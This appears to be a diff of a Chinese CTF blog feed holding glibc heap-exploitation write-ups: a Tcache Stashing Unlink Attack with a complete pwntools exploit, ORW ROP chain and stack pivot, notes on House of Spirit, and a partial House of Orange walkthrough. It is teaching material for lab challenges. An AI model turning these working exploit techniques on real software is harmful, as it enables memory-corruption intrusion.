+<h2 id="构造tcache-bin"><a href="#构造tcache-bin" class="headerlink" title="构造tcache bin"></a>构造tcache bin</h2><p>首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个</p>
+<pre><code>#1.0x10 2.0xf0 3.0x300 4.0x400
+for i in range(7):
+    add(15,4,'Chunk_15')
+    free(15)
+
+for i in range(6):
+    add(14,2,'Chunk_14')
+    free(14)
+
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>此时我们利用UAF可以泄露出heap地址</p>
+<pre><code>show(15)
+last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
+lg('last_chunk_addr',last_chunk_addr)
+heap_addr = last_chunk_addr - 0x26C0
+lg('heap_addr',heap_addr)
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
+<h2 id="利用unsorted-bin构造两个small-bin-chunk"><a href="#利用unsorted-bin构造两个small-bin-chunk" class="headerlink" title="利用unsorted bin构造两个small bin chunk"></a>利用unsorted bin构造两个small bin chunk</h2><blockquote>
+<p>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，<br>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。</p>
+</blockquote>
+<p>我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。</p>
+<p>申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。</p>
+<pre><code>add(1,4,'Chunk_1')
+add(13,3,'Chunk_13')
+
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址</p>
+<pre><code>free(1)
+show(1)
+libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
+lg('libc_base',libc_base)
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</p>
+<pre><code>add(13,3,'Chunk_13')
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
+<p>在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk</p>
+<pre><code>add(13,3,'Chunk_13')
+
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>利用同样方法再构造一个small bin chunk</p>
+<pre><code>add(2,4,'Chunk_2')
+add(13,4,'Chunk_13')
+
+#dbg()
+
+free(2)
+
+#dbg()
+
+add(13,3,'Chunk_13')
+add(13,3,'Chunk_13')
+
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
+<p>并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0</p>
+<h2 id="修改small-bin-chunk的bk指针为first-chunk-0x800"><a href="#修改small-bin-chunk的bk指针为first-chunk-0x800" class="headerlink" title="修改small bin chunk的bk指针为first_chunk+0x800"></a>修改small bin chunk的bk指针为first_chunk+0x800</h2><pre><code>payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
+edit(2,payload)
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.</p>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
+<h2 id="构造ORW的ROP链放入堆块中"><a href="#构造ORW的ROP链放入堆块中" class="headerlink" title="构造ORW的ROP链放入堆块中"></a>构造ORW的ROP链放入堆块中</h2><p>先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40</p>
+<pre><code>pop_rdi_ret = libc_base + 0x0000000000026542
+pop_rsi_ret = libc_base + 0x0000000000026f9e
+pop_rdx_ret = libc_base + 0x000000000012bda6
+file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
+flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
+ROP_chain  = '/flag\x00\x00\x00'
+</code></pre>
+<p>open(file_name_addr,0)</p>
+<pre><code>ROP_chain += p64(pop_rdi_ret)
+ROP_chain += p64(file_name_addr)
+ROP_chain += p64(pop_rsi_ret)
+ROP_chain += p64(0)
+ROP_chain += p64(libc_base+libc.symbols['open'])
+</code></pre>
+<p>read(3,flag_addr,0x40)<br>Read函数的第一个参数文件描述符从0开始累加，<br>程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，<br>这样在程序中，每打开一个文件，文件描述符值从3开始累加。<br>我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件<br>read函数第一个参数是3，就是在这个文件里读取数据。</p>
+<pre><code>ROP_chain += p64(pop_rdi_ret)
+ROP_chain += p64(3)
+ROP_chain += p64(pop_rsi_ret)
+ROP_chain += p64(flag_addr)
+ROP_chain += p64(pop_rdx_ret)
+ROP_chain += p64(0x40)
+ROP_chain += p64(libc_base+libc.symbols['read'])
+</code></pre>
+<p>write(1,flag_addr,0x40)</p>
+<pre><code>ROP_chain += p64(pop_rdi_ret)
+ROP_chain += p64(1)
+ROP_chain += p64(pop_rsi_ret)
+ROP_chain += p64(flag_addr)
+ROP_chain += p64(pop_rdx_ret)
+ROP_chain += p64(0x40)
+ROP_chain += p64(libc_base+libc.symbols['write'])
+</code></pre>
+<p>申请chunk，将ROP链写到chunk里</p>
+<pre><code>add(4,4,ROP_chain)
+
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。<br class='item-img' data-src='https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
+<pre><code>leave_ret = libc_base + 0x0000000000058373
+ru('Your input: ')
+sl('666')
+ru('What do you want to say?')
+#栈迁移
+sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))
+
+itr()
+</code></pre>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code># coding=utf-8
+from pwn import *
+context(endian='little',os='linux',arch='amd64',log_level='debug') 
+
+sh = process('./RedPacket_SoEasyPwn1')
+#sh = remote('node4.buuoj.cn','27283')
+
+libc=ELF("./libc-2.29.so")
+
+ 
+ 
+
+s       = lambda data               :sh.send(data)
+sa      = lambda delim,data         :sh.sendafter(delim, data)
+sl      = lambda data               :sh.sendline(data)
+sla     = lambda delim,data         :sh.sendlineafter(delim, data)
+r       = lambda num=4096           :sh.recv(num)
+ru      = lambda delims		    :sh.recvuntil(delims)
+itr     = lambda                    :sh.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
+def dbg():
+        gdb.attach(sh)
+        pause()
+ 
+
+def add(index,chunk_size_index,value):
+    ru('Your input: ')
+    sl('1')
+    ru('Please input the red packet idx: ')
+    sl(str(index))
+    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')
+    sl(str(chunk_size_index))
+    ru('Please input content: ')
+    sl(value)
+
+def free(index):
+    ru('Your input: ')
+    sl('2')
+    ru('Please input the red packet idx: ')
+    sl(str(index))
+
+def edit(index,value):
+    ru('Your input: ')
+    sl('3')
+    ru('Please input the red packet idx: ')
+    sl(str(index))
+    ru('Please input content: ')
+    sl(value)
+
+def show(index):
+    ru('Your input: ')
+    sl('4')
+    ru('Please input the red packet idx: ')
+    sl(str(index))
+
+
+ 
+
+#1.0x10 2.0xf0 3.0x300 4.0x400
+for i in range(7):
+    add(15,4,'Chunk_15')
+    free(15)
+
+
+
+for i in range(6):
+    add(14,2,'Chunk_14')
+    free(14)
+
+#dbg()
+
+show(15)
+last_chunk_addr = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00'))
+lg('last_chunk_addr',last_chunk_addr)
+heap_addr = last_chunk_addr - 0x26C0
+lg('heap_addr',heap_addr)
+
+#dbg()
+
+add(1,4,'Chunk_1')
+add(13,3,'Chunk_13')
+
+#dbg()
+
+free(1)
+show(1)
+libc_base = u64(ru('\x0A').strip('\x0A').ljust(8,'\x00')) - 0x1E4CA0
+lg('libc_base',libc_base)
+
+
+#dbg()
+
+#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100
+add(13,3,'Chunk_13')
+
+
+#dbg()
+
+#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk
+add(13,3,'Chunk_13')
+
+#dbg()
+
+#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk
+add(2,4,'Chunk_2')
+#申请一个chunk防止合并
+add(13,4,'Chunk_13')
+
+#dbg()
+
+free(2)
+
+#dbg()
+
+add(13,3,'Chunk_13')
+add(13,3,'Chunk_13')
+
+#dbg()
+
+payload='\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)
+edit(2,payload)
+
+#dbg()
+
+add(3,2,'Chunk_3')
+lg('heap_addr',heap_addr)
+
+#dbg()
+
+#ORW
+pop_rdi_ret = libc_base + 0x0000000000026542
+pop_rsi_ret = libc_base + 0x0000000000026f9e
+pop_rdx_ret = libc_base + 0x000000000012bda6
+file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置
+flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容
+ROP_chain  = '/flag\x00\x00\x00'
+#open(file_name_addr,0)
+ROP_chain += p64(pop_rdi_ret)
+ROP_chain += p64(file_name_addr)
+ROP_chain += p64(pop_rsi_ret)
+ROP_chain += p64(0)
+ROP_chain += p64(libc_base+libc.symbols['open'])
+#read(3,flag_addr,0x40)
+#Read函数的第一个参数文件描述符从0开始累加，
+#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，
+#这样在程序中，每打开一个文件，文件描述符值从3开始累加。
+#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件
+#read函数第一个参数是3，就是在这个文件里读取数据。
+ROP_chain += p64(pop_rdi_ret)
+ROP_chain += p64(3)
+ROP_chain += p64(pop_rsi_ret)
+ROP_chain += p64(flag_addr)
+ROP_chain += p64(pop_rdx_ret)
+ROP_chain += p64(0x40)
+ROP_chain += p64(libc_base+libc.symbols['read'])
+#write(1,flag_addr,0x40)
+ROP_chain += p64(pop_rdi_ret)
+ROP_chain += p64(1)
+ROP_chain += p64(pop_rsi_ret)
+ROP_chain += p64(flag_addr)
+ROP_chain += p64(pop_rdx_ret)
+ROP_chain += p64(0x40)
+ROP_chain += p64(libc_base+libc.symbols['write'])
+
+add(4,4,ROP_chain)
+
+#dbg()
+
+leave_ret = libc_base + 0x0000000000058373
+ru('Your input: ')
+sl('666')
+ru('What do you want to say?')
+#栈迁移
+sl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))
+
+#dbg()
+itr()
+</code></pre>
+]]></content>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>House of Spirit</title>
+    <url>/2023/04/10/House%20of%20Spirit/</url>
+    <content><![CDATA[<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p>
+<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
+<pre><code>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。
+fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
+fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。
+fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。
+fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。
+</code></pre>
+<p>想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。</p>
+]]></content>
+      <tags>
+        <tag>House of 系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>House of Storm + 堆SROP + orw</title>
+    <url>/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/</url>
     <content><![CDATA[<p><strong>同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，<br>若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。</strong></p>
 <h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
 <p class='item-img' data-src='https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。<br>看一下ida</p>
@@ -1319,11 +2354,434 @@ def pwn():
 pwn()
 </code></pre>
 ]]></content>
+      <tags>
+        <tag>House of 系列</tag>
+      </tags>
   </entry>
   <entry>
-    <title>House Of Storm</title>
+    <title>House of Orange</title>
+    <url>/2023/04/10/House%20of%20Orange/</url>
+    <content><![CDATA[<h1 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>题目中不存在 free 函数或其他释放堆块的函数。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><pre><code>1.篡改top chunk size（注意size需要对齐内存页）
+2.分配比top chunk size大的chunk。
+3.现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。
+</code></pre>
+<h3 id="注意：伪造top-chunk-size时，必须满足以下要求"><a href="#注意：伪造top-chunk-size时，必须满足以下要求" class="headerlink" title="注意：伪造top chunk size时，必须满足以下要求"></a>注意：伪造top chunk size时，必须满足以下要求</h3><pre><code>1.伪造的size必须要对齐到内存页。
+2.size要大于MINSIZE。
+3.size要小于之后申请的chunk size + MINISIZE。
+4.size的prev inuse位必须为1。
+5.malloc的大小不能大于mmap分配阈值。
+</code></pre>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>保护全开，打开ida</p>
+<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><pre><code>void __fastcall __noreturn main(const char *a1, char **a2, char **a3)
+{
+  int choice; // eax
+
+  sub_1218();
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      choice = my_read(a1, a2);
+      if ( choice != 2 )
+        break;
+      show();
+    }
+    if ( choice &gt; 2 )
+    {
+      if ( choice == 3 )
+      {
+        edit();
+      }
+      else
+      {
+        if ( choice == 4 )
+        {
+          puts("give up");
+          exit(0);
+        }
+LABEL_13:
+        a1 = "Invalid choice";
+        puts("Invalid choice");
+      }
+    }
+    else
+    {
+      if ( choice != 1 )
+        goto LABEL_13;
+      add();
+    }
+  }
+}
+</code></pre>
+<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。</p>
+<pre><code>int add()
+{
+  unsigned int size; // [rsp+8h] [rbp-18h]
+  int color; // [rsp+Ch] [rbp-14h]
+  _QWORD *v3; // [rsp+10h] [rbp-10h]
+  _DWORD *v4; // [rsp+18h] [rbp-8h]
+
+  if ( num2 &gt; 3u )                              // num开始为0，可利用add4次
+  {
+    puts("Too many house");
+    exit(1);
+  }
+  v3 = malloc(0x10uLL);   //chunk_1
+  printf("Length of name :");
+  size = my_read();
+  if ( size &gt; 0x1000 )
+    size = 0x1000;
+  v3[1] = malloc(size);     //chunk_2
+  if ( !v3[1] )
+  {
+    puts("Malloc error !!!");
+    exit(1);
+  }
+  printf("Name :");
+  my_read2((void *)v3[1], size);
+  v4 = calloc(1uLL, 8uLL);      //chunk_3
+  printf("Price of Orange:");
+  *v4 = my_read();
+  ::color();
+  printf("Color of Orange:");
+  color = my_read();
+  if ( color != 0xDDAA &amp;&amp; (color &lt;= 0 || color &gt; 7) )
+  {
+    puts("No such color");
+    exit(1);
+  }
+  if ( color == 0xDDAA )
+    v4[1] = 0xDDAA;
+  else
+    v4[1] = color + 30;
+  *v3 = v4;
+  heap_array = v3;
+  ++num2;
+  return puts("Finish");
+}
+</code></pre>
+<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int sub_EE6()
+{
+  int v0; // eax
+  int v2; // eax
+
+  if ( !heap_array )
+    return puts("No such house !");
+  if ( *(_DWORD *)(*heap_array + 4LL) == 0xDDAA )
+  {
+    printf("Name of house : %s\n", (const char *)heap_array[1]);
+    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);
+    v0 = rand();
+    return printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&amp;unk_203080 + v0 % 8));
+  }
+  else
+  {
+    if ( *(int *)(*heap_array + 4LL) &lt;= 30 || *(int *)(*heap_array + 4LL) &gt; 37 )
+    {
+      puts("Color corruption!");
+      exit(1);
+    }
+    printf("Name of house : %s\n", (const char *)heap_array[1]);
+    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);
+    v2 = rand();
+    return printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*heap_array + 4LL), *((const char **)&amp;unk_203080 + v2 % 8));
+  }
+}
+</code></pre>
+<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次</p>
+<pre><code>int sub_107C()
+{
+  _DWORD *v1; // rbx
+  unsigned int size; // [rsp+8h] [rbp-18h]
+  int v3; // [rsp+Ch] [rbp-14h]
+
+  if ( num &gt; 2u )                               // num开始为0，可利用edit3次
+    return puts("You can't upgrade more");
+  if ( !heap_array )
+    return puts("No such house !");
+  printf("Length of name :");
+  size = my_read();
+  if ( size &gt; 0x1000 )
+    size = 4096;
+  printf("Name:");                              // size由我们输入，存在溢出
+  my_read2((void *)heap_array[1], size);
+  printf("Price of Orange: ");
+  v1 = (_DWORD *)*heap_array;
+  *v1 = my_read();
+  color();
+  printf("Color of Orange: ");
+  v3 = my_read();
+  if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )
+  {
+    puts("No such color");
+    exit(1);
+  }
+  if ( v3 == 0xDDAA )
+    *(_DWORD *)(*heap_array + 4LL) = 0xDDAA;
+  else
+    *(_DWORD *)(*heap_array + 4LL) = v3 + 30;
+  ++num;
+  return puts("Finish");
+}
+</code></pre>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先把前面的写好</p>
+<pre><code># coding=utf-8
+from pwn import  *
+ 
+context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
+ 
+binary = './houseoforange_hitcon_2016'  
+#sh = process(binary) #连接本地程序
+sh = remote('node4.buuoj.cn',26188) #连接远程程序
+elf = ELF(binary)     
+libc = ELF('../../libc-2.23.so--64')  
+
+#libc-2.23.so--64
+one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget[0] = 0x45216
+s       = lambda data               :sh.send(data)
+sa      = lambda delim,data         :sh.sendafter(delim, data)
+sl      = lambda data               :sh.sendline(data)
+sla     = lambda delim,data         :sh.sendlineafter(delim, data)
+r       = lambda num=4096           :sh.recv(num)
+ru      = lambda delims  :sh.recvuntil(delims )
+itr     = lambda                    :sh.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+lg=lambda address,data:log.success('%s: '%(address)+hex(data))
+#定义gdb调试函数
+def dbg():
+        gdb.attach(sh)
+        pause()
+def add(size, content, price='2', color='1'):
+    ru("Your choice : ")
+    sl('1')
+    ru("Length of name :")
+    sl(str(size))
+    ru("Name :")
+    sh.send(content)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")    #1-7
+    sl(str(color))
+
+
+def show():
+    ru("Your choice : ")
+    sl('2')
+
+def edit(size, content, price='2', color='1'):
+    ru("Your choice : ")
+    sl('3')
+    ru("Length of name :")
+    sl(str(size))
+    ru("Name:")
+    sh.send(content)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")    #1-7
+    sl(str(color))
+</code></pre>
+<h3 id="修改top-chunk"><a href="#修改top-chunk" class="headerlink" title="修改top chunk"></a>修改top chunk</h3><p>随便申请一个chunk，然后利用edit函数，溢出修改topchunk</p>
+<pre><code>add(0x30,'aaaa\n')
+dbg()
+payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(2) + p64(0) * 2 + p64(0xf81)
+edit(len(payload), payload)
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>top chunk大小为0x0000000000020f81<br>修改后的top chunk 大小为0x0000000000000f81<br class='item-img' data-src='https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<h3 id="申请大于top-chunk的chunk，进入unsortedbin"><a href="#申请大于top-chunk的chunk，进入unsortedbin" class="headerlink" title="申请大于top chunk的chunk，进入unsortedbin"></a>申请大于top chunk的chunk，进入unsortedbin</h3><pre><code>add(0x1000, 'a\n')
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<h3 id="泄露libc和heap"><a href="#泄露libc和heap" class="headerlink" title="泄露libc和heap"></a>泄露libc和heap</h3><p>调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出</p>
+<pre><code>add(0x400, 'a' * 8)
+show()
+ru('a'*8)
+libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188
+lg('libc.address',libc.address)
+io_list_all = libc.symbols['_IO_list_all']
+system = libc.symbols['system']
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<p>我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址</p>
+<pre><code>payload = 'b' * 0x10
+edit(0x10, payload)
+show()
+ru('b'*0x10)
+heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))
+heap_base = heap - 0xE0
+lg('heap_base',heap_base)
